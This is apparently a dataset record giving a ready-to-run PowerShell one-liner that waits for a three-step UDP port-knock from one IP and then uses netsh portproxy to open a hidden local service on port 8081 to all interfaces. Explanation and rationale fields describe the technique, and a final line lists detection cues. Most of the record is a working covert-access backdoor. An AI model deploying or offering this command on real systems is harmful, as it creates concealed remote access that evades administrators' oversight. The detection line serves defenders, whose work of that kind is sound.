command: $ports=@(2345,3456,4567);$clients=$ports|ForEach-Object{New-Object System.Net.Sockets.UdpClient($_)};$state=@{};while($true){foreach($c in $clients){if($c.Available -gt 0){$ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0);$b=$c.Receive([ref]$ep);$ip=$ep.Address.ToString();$idx=[array]::IndexOf($ports,$c.Client.LocalEndPoint.Port);if(($idx -eq 0) -or ($state[$ip] -eq ($idx-1))){$state[$ip]=$idx;if($state[$ip] -eq ($ports.Count-1)){& netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8081 connectaddress=127.0.0.1 connectport=8081;break}}}}Start-Sleep -Milliseconds 50}
explanation: Implements a three-step UDP port-knock (2345 -> 3456 -> 4567) from the same source IP. When the sequence is correct, it exposes a hidden service by adding a netsh portproxy from 0.0.0.0:8081 to 127.0.0.1:8081. Requires Administrator due to portproxy configuration.
rationale_steps: Listen on three UDP ports for a specific ordered knock sequence from the same sender.
On successful sequence, create a v4tov4 port proxy with netsh to reveal an internal service.

Detection: alert on creation of portproxy entries (registry HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\), process creation of netsh.exe with 'interface portproxy', and bursts of UDP packets to uncommon ports.
